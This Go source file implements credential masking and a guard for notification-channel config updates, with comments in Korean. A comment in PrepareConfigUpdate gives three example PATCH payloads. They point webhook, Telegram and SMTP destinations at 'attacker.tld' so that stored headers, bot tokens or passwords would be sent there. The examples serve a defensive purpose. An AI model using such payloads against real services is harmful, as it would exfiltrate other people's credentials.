package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix 마스킹 값의 표시 접두사다. API가 자격 증명을 되비칠 때 이 접두사가 붙은 값으로 실제 내용을 치환하고,
// 업데이트 인터페이스가 이 접두사가 붙은 값을 받으면「DB의 원래 값을 그대로 유지」로 이해한다.
//
// 빈 문자열이나 어떤 고정 상수가 아니라 접두사를 쓰는 것은, 식별 가능한 정보를 조금 함께 실어 보내기 위함이다
// （MaskedValue 참조）, 사용자가 키를 다시 붙여넣지 않고도「이게 어느 봇인지」구분할 수 있게 한다.
const MaskedPrefix = "__masked__"

// MaskedValue 마스킹 값 하나를 생성한다:
//
//	"__masked__"              원래 값이 너무 짧아, 아무 힌트도 주지 않음
//	"__masked__:원래 값 끝 6자리를 식별 힌트로 함께 실음
//
// 끝 6자리만 노출하는 것은 의도적 선택이다:Webhook 주소의 식별 정보는 끝부분에 있다（예: 위챗워크의 key、
// 페이슈의 봇 id）, 접두사 부분은 봇마다 같아서、식별 가치가 없다. 끝 6자리로는
// 자격 증명을 복원하기엔 부족하지만,「내 그 그룹이다」라고 설정자가 알아보기엔 충분하다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked 어떤 값이 마스킹 값인지（즉 인터페이스 되비침 후 수정되지 않았는지）보고한다.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig 설정의 복사본을 반환하면서, 해당 채널의 자격 증명 필드를 마스킹 값으로 치환한다.
//
// 알 수 없는 채널 유형은 원본 설정이 아니라 빈 map을 반환한다——차라리 UI가「설정 사용 불가」를 표시하게 할지언정,
// 채널 유형을 식별할 수 없을 때 자격 증명이 포함됐을 수 있는 원본 내용을 통째로 뱉어내지 않는다.
// 자격 증명이 아닌 필드는 원본 그대로 보존해야, UI가 정상적으로 표시할 수 있다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers headers 같은 중첩 구조는 전체를 하나의 자격 증명으로 처리한다:하위 키를 하나씩 판단하려면 채널마다
		// 「어느 하위 키가 자격 증명인지」규칙을 한 세트 더 선언해야 하는데, 복잡도가 이득을 훨씬 넘는다.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials 「대상 주소가 바뀌었지만, 호출 측이
// 자격 증명 필드에 대해 표명하지 않았음」을 나타낸다. 이것을 반환하고 조용히 통과시키거나 조용히 자격 증명을 버리지 않는 이유는 PrepareConfigUpdate 참조.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 변경이 발생한 목적지 키
	Missing []string // 명시적으로 표명하지 않은 자격 증명 키
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소（" + strings.Join(e.Changed, "、") + "）가 변경되었습니다. 자격 증명 필드（" +
		strings.Join(e.Missing, "、") + "）도 함께 다시 입력하세요: 새 값을 넣거나, 명시적으로 비워 두어 자격 증명이 더는 필요 없음을 표시하세요. " +
		"기존 자격 증명은 기존 주소에만 유효하며, 계속 사용하면 그것을 새 주소에 넘기는 셈입니다."
}

// PrepareConfigUpdate 채널 설정을 병합하고,「대상 주소 변경」이라는 보안 민감 상황을 처리한다.
//
// 맨 MergeConfig를 대체해 채널 업데이트 경로에 쓰이며, 실측으로 가능한 다음 경로를 해결한다:
// 대상 주소（메시지를 어디로 보낼지）와 자격 증명（어떤 신원으로 보낼지）은 서로 독립된 두 세트의 필드이고, MergeConfig는 MergeConfig
// 「언급되지 않은 키」에 대해 일률적으로 DB의 원래 값을 보존한다. 그래서 채널을 PATCH할 수 있는 누구든 **주소만 바꾸고、
// 자격 증명은 언급을 피하기**만 하면, 서버가 DB의 진짜 자격 증명을 자신이 제어하는 엔드포인트로 보내게 할 수 있다:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 원본 Authorization 헤더가 요청과 함께 외부로 발송됨
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<진짜Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 후 사용자명과 비밀번호를 넘겨줌
//
// 이 경로는 완전히 조용하고、리다이렉트에 의존하지 않는다（그래서 크로스 호스트 점프 거부로는 막을 수 없다）,
// 게다가 이 패키지 마스킹 메커니즘의 목표——「자격 증명을 브라우저에 되비치지 않음」을 바로 관통한다.
//
// 규칙:어떤 목적지 키가 새 값으로 바뀌기만 하면, 호출 측은 반드시 **모든** 자격 증명 키에 대해 명시적으로 표명해야 한다:
//   - 새 값을 제시 → 새 값 사용
//   - 명시적으로 빈 문자열 전달 → 이 필드에 더는 자격 증명이 필요 없음（비우기 의미 보존）
//   - 마스킹 값을 원본 그대로 되돌려 보냄 / 아예 이 키를 언급 안 함 → 거부
//
// 세 번째가 거부되는 이유는「마스킹 값」의 의미가 바로「기존 자격 증명을 그대로 사용」이기 때문인데, 기존 자격 증명은
// 기존 주소에만 유효하다. 여기서는 의도적으로「자동 자격 증명 폐기」를 하지 않는다——그것은 선택적 자격 증명 필드
// （webhook의 headers、email의 password）에 대해「인증이 사라졌는데 인터페이스는 200을 반환」으로 조용히 변하니,
// 에러보다 트러블슈팅이 더 어렵다. 차라리 운영자가 한 번 더 입력하게 한다.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("채널 유형 %q 미등록", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열이 아닌 자격 증명 값（예: webhook의 headers는 객체）에 마스킹 리터럴이 박혀 있으면,
	// 호출 측이「원래 값 유지」센티넬을 구조체 내부에 쑤셔 넣었다는 뜻이다. MergeConfig는「문자열
	// 이면서 접두사가 붙은 것」만 마스킹으로 인식하므로, 이런 형태는 보통 객체로 간주돼 원본 그대로 저장된다——DB에 진짜로 리터럴
	// "__masked__"，이후 인증이 조용히 실패하고 아무 에러도 없다. 차라리 거부한다.
	//
	// 이 검사는 반드시 **맨 앞에** 둬야 한다:주소가 안 바뀌면 조기 반환으로 빠지므로, 뒤에 두면
	// 「주소 변경」이라는 한 경로만 커버하는 셈이 된다（첫 버전이 바로 이렇게 잘못 뒀고, 테스트가 바로 잡아냈다）.
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제로 바뀐 목적지 키를 찾아낸다. 마스킹 값은「안 바꿈」과 같다.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소가 안 바뀌면, 일반 병합으로 간다（마스킹 값은 원래 값 보존、빈 문자열은 비우기、나머지는 덮어쓰기）.
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 바뀌었다:모든 자격 증명 키에 대해 명시적 표명을 요구한다.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers 마스킹 센티넬을 문자열이 아닌 구조에 박아 제출하는 것을 거부한다.
//
// 마스킹 메커니즘의 전제는「값 전체가 하나의 문자열」이다. webhook의 headers 같은 객체 필드는,
// 전체를 마스킹하거나（문자열 "__masked__"로 작성）전체를 제출할 수만 있다;센티넬을 객체 내부에 쑤셔 넣으면
// 「변하지 않음」을 표현할 수도 없고, 진짜 값으로 간주돼 DB에 저장된다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("필드 %s의 내용에 마스킹 마커 %q가 포함됨:이 필드는 전체를 비워 두어 기존 값 사용을 나타내거나、전체를 새 값으로 제출할 수만 있고, 구조체 내부에 마스킹 플레이스홀더를 끼워 넣을 수 없음",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue 두 설정 값이 등가인지 비교한다. JSON 직렬화로 비교하는 것은 겸사겸사 처리하기 위함이다
// 타입 차이를——프런트엔드가 제출한 포트는 number인데, DB에서 읽어 온 것은 float64라, 바로 ==하면 오판한다.
//
// 「빈 값」은 반드시 먼저 정규화한 뒤 비교해야 한다:빈 문자열과「키 없음」은 이 설정 모델에서 같은 상태이고,
// 왜냐하면 MergeConfig가 빈 문자열을 명시적 비우기로 간주해、해당 키를 바로 delete하기 때문이다. 정규화하지 않으면, 하나의
// 항상 비워 두는 선택적 목적지 필드（Telegram의 base_url이 유일하게 이런 필드다:비워 두면
// 공식 주소 사용）이 이 경로로 가게 된다——
//
//	신규 생성 시 base_url:""를 저장  →  첫 저장에서 MergeConfig가 키 삭제
//	→ 두 번째 저장 시 incoming은 ""、stored는 키가 없어,「주소가 바뀜」으로 판정됨
//	→ 자격 증명이 마스킹 값 → 400「대상 주소가 이미 변경됨, 자격 증명 필드도 함께 다시 입력하세요」
//
// 그 뒤로 저장할 때마다 실패한다, 사용자가 Bot Token을 다시 한 번 붙여넣지 않는 한, 정작 아무것도 바꾸지 않았는데도.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue 설정 값 하나가「빈 값」인지 판정한다.
// 기준은 반드시 MergeConfig의 비우기 판정과 일치해야 한다（strings.TrimSpace(s) == ""）,
// 아니면「MergeConfig는 삭제해야 한다고 보고、sameConfigValue는 값이 있다고 보는」틈이 생긴다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig incoming을 stored 위에 병합하며, 채널 설정 업데이트에 쓴다.
//
// 규칙:
//   - incoming 안의 값이 마스킹인 키 → stored의 원래 값 보존（사용자가 이 필드를 안 바꿈）
//   - incoming 안의 값이 빈 문자열인 키 → 명시적 비우기로 간주, 해당 키 삭제
//   - 나머지 키 → incoming의 값으로 덮어쓰기
//   - stored 에는 있지만 incoming에는 없는 키 → 보존（부분 업데이트 의미）
//
// 빈 문자열을「비우기」로 칠지 명확히 해야 한다:프런트엔드 폼이 미입력 필드를 빈 문자열로 제출하는데,
// 그것을 유효한 값으로 간주해 쓰면,「비워 둬서 원래 값을 보존」하려던 필드가 진짜로 비워진다.
// 여기서는 명시적 비우기를 택한다, 잘못 설정한 필드를 지우려 할 때 사용자에게 다른 표현 방법이 없기 때문이다
// （필드를 끌어내면「미제공」과「빈 값 제공」을 구분할 수 있지만, UI는 이 구분을 쓰지 않는다）.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 마스킹 값 = 수정 안 함, 보존: stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
